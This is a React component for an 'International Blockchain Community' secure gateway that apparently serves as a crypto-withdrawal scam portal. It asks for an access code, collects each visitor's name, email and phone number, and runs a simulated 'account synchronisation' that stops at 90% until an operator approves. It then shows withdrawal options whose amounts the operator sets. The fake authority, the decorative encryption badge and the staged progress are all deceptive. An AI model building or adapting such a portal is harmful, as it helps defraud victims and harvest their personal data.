import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Progress } from "@/components/ui/progress";
import { ShieldCheck, Lock, ArrowRight, CheckCircle2, AlertCircle, Globe, FileText, Activity, Key, Loader2, User, Mail, Phone } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
import { useToast } from "@/hooks/use-toast";

// Types shared with Admin (ideally in a shared file)
interface AdminData {
  vipStatus: string;
  username: string;
  withdrawalAmount: string;
  withdrawalBatches: string;
  physilocal0: string;
}

interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
}

export default function SecurePortal() {
  // Flow State: 'login' -> 'register' -> 'sync' -> 'letter' -> 'success'
  const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'letter' | 'success'>('login');
  
  // Data State
  const [currentCase, setCurrentCase] = useState<Case | null>(null);
  const [accessCode, setAccessCode] = useState("");
  
  // Registration Form
  const [regName, setRegName] = useState("");
  const [regEmail, setRegEmail] = useState("");
  const [regMobile, setRegMobile] = useState("");
  
  // Sync State
  const [syncProgress, setSyncProgress] = useState(0);
  const [syncStatusText, setSyncStatusText] = useState("Initializing secure handshake...");
  
  // Letter Form State
  const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
  const [isConfirming, setIsConfirming] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const { toast } = useToast();

  // ------------------------------------------------------------------
  // POLLING EFFECT (For Sync Phase)
  // ------------------------------------------------------------------
  useEffect(() => {
    if (viewState !== 'sync' || !currentCase) return;

    const interval = setInterval(async () => {
      try {
        const response = await fetch(`/api/cases/access/${currentCase.accessCode}`);
        if (response.ok) {
          const updatedCase = await response.json();
          
          if (updatedCase.status === 'active') {
            setCurrentCase(updatedCase);
            // Wait a moment to show 100% before transitioning
            setSyncProgress(100);
            setSyncStatusText("Synchronization Complete.");
            setTimeout(() => setViewState('letter'), 1000);
          }
        }
      } catch (error) {
        console.error('Failed to poll case status:', error);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [viewState, currentCase]);

  // ------------------------------------------------------------------
  // HANDLERS
  // ------------------------------------------------------------------

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const response = await fetch(`/api/cases/access/${accessCode}`);
      
      if (response.ok) {
        const foundCase = await response.json();
        
        if (foundCase.status !== 'completed') {
          setCurrentCase(foundCase);
          // If already registered, go to sync or letter
          if (foundCase.status === 'active') setViewState('letter');
          else if (foundCase.status === 'syncing') setViewState('sync');
          else setViewState('register');
          
          toast({
            title: "Identity Verified",
            description: "Secure session established.",
            className: "bg-green-50 border-green-200 text-green-900",
          });
        } else {
          toast({
            variant: "destructive",
            title: "Access Denied",
            description: "This case has been completed.",
          });
        }
      } else {
        toast({
          variant: "destructive",
          title: "Access Denied",
          description: "Invalid clearance code provided.",
        });
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Connection Error",
        description: "Unable to verify credentials.",
      });
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentCase) return;

    try {
      const response = await fetch(`/api/cases/${currentCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'syncing',
          userName: regName,
          userEmail: regEmail,
          userMobile: regMobile
        })
      });

      if (response.ok) {
        const updatedCase = await response.json();
        setCurrentCase(updatedCase);
        setViewState('sync');
        startSyncSimulation();
      } else {
        toast({
          variant: "destructive",
          title: "Registration Failed",
          description: "Unable to complete registration.",
        });
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Connection Error",
        description: "Unable to save registration.",
      });
    }
  };

  const startSyncSimulation = () => {
    // Simulate progress steps up to 90%, then wait for admin
    let progress = 0;
    const interval = setInterval(() => {
      progress += 5;
      if (progress <= 30) setSyncStatusText("Account phrase key generation process successfully started...");
      else if (progress <= 60) setSyncStatusText("File of customer is now being sorted...");
      else if (progress <= 90) setSyncStatusText("Account information is now being synchronised...");
      else {
        setSyncStatusText("Waiting for Final Clearance from ISO-D Secretariat...");
        clearInterval(interval);
      }
      setSyncProgress(Math.min(progress, 90));
    }, 800);
  };

  const handleSelect = (option: "A" | "B") => {
    setSelectedOption(option);
    setIsConfirming(true);
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);

    if (currentCase && selectedOption) {
      try {
        const response = await fetch(`/api/cases/${currentCase.id}`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            status: 'completed',
            selectedOption: selectedOption,
            submittedAt: new Date().toISOString()
          })
        });

        if (response.ok) {
          setIsSubmitting(false);
          setIsConfirming(false);
          setViewState('success');
        } else {
          toast({
            variant: "destructive",
            title: "Submission Failed",
            description: "Unable to submit selection.",
          });
          setIsSubmitting(false);
        }
      } catch (error) {
        toast({
          variant: "destructive",
          title: "Connection Error",
          description: "Unable to submit selection.",
        });
        setIsSubmitting(false);
      }
    }
  };

  // ------------------------------------------------------------------
  // VIEWS
  // ------------------------------------------------------------------

  if (viewState === 'login') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
          <div className="text-center mb-8">
            <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" />
            <h1 className="text-xl font-bold text-white tracking-wider">SECURE GATEWAY ACCESS</h1>
            <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">Account Integrity Division</p>
          </div>
          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
            <CardHeader>
              <CardTitle className="text-white text-center flex items-center justify-center gap-2">
                <Lock className="w-4 h-4 text-blue-500" /> Verification Required
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleLogin} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Compliance Clearance Reference</label>
                  <div className="relative">
                    <Key className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input 
                      type="password" 
                      placeholder="Enter Access Code" 
                      className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600 focus:ring-blue-500"
                      value={accessCode}
                      onChange={(e) => setAccessCode(e.target.value)}
                    />
                  </div>
                </div>
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white">Verify Identity</Button>
              </form>
            </CardContent>
            <CardFooter className="border-t border-slate-800 pt-4 pb-6 flex justify-center">
              <div className="flex items-center gap-2 text-[10px] text-slate-500 uppercase tracking-wider">
                 <ShieldCheck className="w-3 h-3" /> 256-bit SSL Encrypted
              </div>
            </CardFooter>
          </Card>
        </motion.div>
      </div>
    );
  }

  if (viewState === 'register') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="max-w-md w-full">
          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
            <CardHeader>
              <CardTitle className="text-white">Identity Verification</CardTitle>
              <DialogDescription className="text-slate-400">Please confirm your contact details for the secure ledger.</DialogDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleRegister} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Full Legal Name</label>
                  <div className="relative">
                    <User className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required value={regName} onChange={e => setRegName(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="e.g. Luzmila Chavez" />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Email Address</label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required type="email" value={regEmail} onChange={e => setRegEmail(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="name@example.com" />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Mobile Number</label>
                  <div className="relative">
                    <Phone className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required type="tel" value={regMobile} onChange={e => setRegMobile(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="+1 (555) 000-0000" />
                  </div>
                </div>
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white mt-4">
                  Proceed to Secure Synchronization
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>
      </div>
    );
  }

  if (viewState === 'sync') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-md w-full text-center">
          <div className="mb-8 relative">
             <div className="w-24 h-24 rounded-full border-4 border-blue-500/30 border-t-blue-500 animate-spin mx-auto"></div>
             <div className="absolute inset-0 flex items-center justify-center">
               <Lock className="w-8 h-8 text-blue-500" />
             </div>
          </div>
          
          <h2 className="text-2xl font-bold text-white mb-2">Synchronizing Account</h2>
          <p className="text-slate-400 text-sm mb-8 h-6">{syncStatusText}</p>
          
          <div className="bg-slate-800 rounded-full h-2 mb-2 overflow-hidden">
            <motion.div 
              className="h-full bg-blue-500" 
              initial={{ width: "0%" }}
              animate={{ width: `${syncProgress}%` }}
              transition={{ duration: 0.5 }}
            />
          </div>
          <div className="flex justify-between text-xs text-slate-500 font-mono">
            <span>ISO-D PROTOCOL</span>
            <span>{syncProgress}%</span>
          </div>

          {syncProgress >= 90 && (
             <div className="mt-8 p-4 bg-amber-500/10 border border-amber-500/20 rounded text-amber-400 text-xs animate-pulse">
               Wait for administrative clearance...
             </div>
          )}
        </motion.div>
      </div>
    );
  }

  if (viewState === 'success') {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full bg-white rounded-lg shadow-xl overflow-hidden border-t-4 border-green-600">
          <div className="p-8 text-center">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle2 className="w-10 h-10 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-slate-900 mb-2">Selection Confirmed</h2>
            <p className="text-slate-600 mb-6">
              Your request has been securely transmitted to the International Blockchain Community (IBC) admin panel.
            </p>
            <Button onClick={() => window.location.reload()} variant="outline" className="w-full">Return to Dashboard</Button>
          </div>
        </motion.div>
      </div>
    );
  }

  // ------------------------------------------------------------------
  // LETTER VIEW (Using Admin Data)
  // ------------------------------------------------------------------
  const adminData = currentCase ? {
    vipStatus: currentCase.vipStatus,
    username: currentCase.username,
    withdrawalAmount: currentCase.withdrawalAmount,
    withdrawalBatches: currentCase.withdrawalBatches,
    physilocal0: currentCase.physilocal0
  } : undefined;

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-blue-100">
      {/* Top Navigation Bar */}
      <nav className="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16">
            <div className="flex items-center gap-3">
              <img src={ibcLogo} alt="IBC Logo" className="h-8 w-8 object-contain" />
              <div className="hidden md:block">
                <div className="text-sm font-bold text-primary leading-none">IBC SECURE GATEWAY</div>
                <div className="text-[10px] text-slate-500 font-medium tracking-wider uppercase">Account Integrity Division</div>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full text-xs font-medium border border-green-100">
                <ShieldCheck className="w-3 h-3" />
                <span>Verified: {adminData?.vipStatus || "Standard"}</span>
              </div>
              <div className="flex items-center gap-2 text-xs text-slate-500">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                Connected
              </div>
            </div>
          </div>
        </div>
      </nav>

      <main className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
          {/* Header Section */}
          <div className="mb-10 text-center md:text-left">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-blue-50 text-blue-700 text-xs font-bold uppercase tracking-wide mb-4 border border-blue-100">
              <Lock className="w-3 h-3" /> Action Required
            </div>
            <h1 className="text-3xl md:text-4xl font-serif font-bold text-slate-900 mb-2">
              Withdrawal Protocol Selection
            </h1>
            <p className="text-sm text-slate-400 mb-6 font-mono">Reference: IBC-AML-CC-774982 • Physilocal0: {adminData?.physilocal0}</p>
          </div>

          {/* Full Letter Content */}
          <div className="bg-white rounded-lg border border-slate-200 p-8 md:p-10 shadow-sm mb-10 relative overflow-hidden">
            <div className="absolute top-[-20%] right-[-10%] w-[50%] h-[150%] opacity-[0.03] pointer-events-none">
              <img src={ibcLogo} alt="" className="w-full h-full object-contain" />
            </div>
            <div className="relative z-10 max-w-3xl">
              <div className="mb-6 pb-6 border-b border-slate-100">
                 <h2 className="text-lg font-bold text-primary font-serif mb-1">INTERNATIONAL BLOCKCHAIN COMMUNITY (IBC)</h2>
                 <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Account Integrity & Security Operations Division (ISO-D)</p>
                 <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Global Compliance Secretariat</p>
              </div>
              <div className="prose prose-slate text-slate-700 max-w-none text-sm leading-relaxed">
                <p className="font-bold text-base text-slate-900 font-serif mb-4">Dear {currentCase?.userName || "Client"},</p>
                <p className="mb-4">
                  We acknowledge the successful completion of your re-authentication procedure. In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account <strong>{adminData?.username}</strong>.
                </p>
                <p className="mb-4">
                  <strong>NEXT ACTION REQUIRED:</strong> Please confirm your preferred withdrawal option below.
                </p>
              </div>
            </div>
          </div>

          {/* Dynamic Options Grid based on Admin Data */}
          <h3 className="text-xl font-serif font-bold text-slate-900 mb-6 flex items-center gap-3">
            <div className="w-8 h-[1px] bg-slate-300"></div>
            Select Withdrawal Option
            <div className="w-full h-[1px] bg-slate-300"></div>
          </h3>
          
          <div className="grid md:grid-cols-2 gap-8 mb-12">
            {/* Option A */}
            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`} onClick={() => handleSelect('A')}>
                <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <div className="text-xs font-bold text-primary uppercase tracking-wider mb-1">Option A – Accelerated</div>
                      <CardTitle className="text-2xl font-bold text-slate-900">Accelerated Release</CardTitle>
                    </div>
                    <div className="h-10 w-10 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold">A</div>
                  </div>
                </CardHeader>
                <CardContent className="pt-6 space-y-4">
                  <div className="flex justify-between items-baseline">
                    <span className="text-2xl font-bold text-primary">{adminData?.withdrawalAmount}</span>
                  </div>
                  <div className="space-y-3 pt-2">
                    <div className="flex justify-between text-sm py-2 border-b border-slate-100">
                      <span className="text-slate-600">Total Batches</span>
                      <span className="font-semibold text-slate-900">{adminData?.withdrawalBatches} Transfers</span>
                    </div>
                    <div className="flex justify-between text-sm py-2 bg-blue-50 px-3 rounded text-blue-900">
                      <span className="font-semibold">Physilocal0</span>
                      <span className="font-bold">{adminData?.physilocal0}</span>
                    </div>
                  </div>
                </CardContent>
                <CardFooter className="pt-2 pb-6">
                  <Button className="w-full" variant={selectedOption === 'A' ? 'default' : 'outline'}>Select Option A</Button>
                </CardFooter>
              </Card>
            </motion.div>

             {/* Option B (Derived/Static for demo) */}
             <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'B' ? 'border-slate-400 ring-4 ring-slate-200 shadow-xl' : 'border-slate-200 hover:border-slate-300 hover:shadow-lg'}`} onClick={() => handleSelect('B')}>
                <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <div className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Option B – Standard</div>
                      <CardTitle className="text-2xl font-bold text-slate-900">Standard Release</CardTitle>
                    </div>
                    <div className="h-10 w-10 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 font-bold">B</div>
                  </div>
                </CardHeader>
                <CardContent className="pt-6 space-y-4">
                  <div className="flex justify-between items-baseline">
                    <span className="text-2xl font-bold text-slate-700">Half Allocation</span>
                  </div>
                  <div className="space-y-3 pt-2">
                    <div className="flex justify-between text-sm py-2 border-b border-slate-100">
                      <span className="text-slate-600">Total Batches</span>
                      <span className="font-semibold text-slate-900">{parseInt(adminData?.withdrawalBatches || "0") * 2} Transfers</span>
                    </div>
                    <div className="flex justify-between text-sm py-2 bg-slate-100 px-3 rounded text-slate-900">
                      <span className="font-semibold">Physilocal0</span>
                      <span className="font-bold">{adminData?.physilocal0}</span>
                    </div>
                  </div>
                </CardContent>
                <CardFooter className="pt-2 pb-6">
                  <Button className="w-full" variant={selectedOption === 'B' ? 'secondary' : 'outline'}>Select Option B</Button>
                </CardFooter>
              </Card>
            </motion.div>
          </div>

          {/* Confirmation Modal */}
          <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
            <DialogContent className="sm:max-w-md">
              <DialogHeader>
                <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
                <DialogDescription>
                  You are about to initiate the withdrawal schedule for {adminData?.username}.
                </DialogDescription>
              </DialogHeader>
              <DialogFooter>
                <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
                <Button onClick={handleSubmit} disabled={isSubmitting} className="w-full sm:w-auto gap-2">
                  {isSubmitting ? "Transmitting..." : "Submit Selection"}
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        </motion.div>
      </main>
    </div>
  );
}
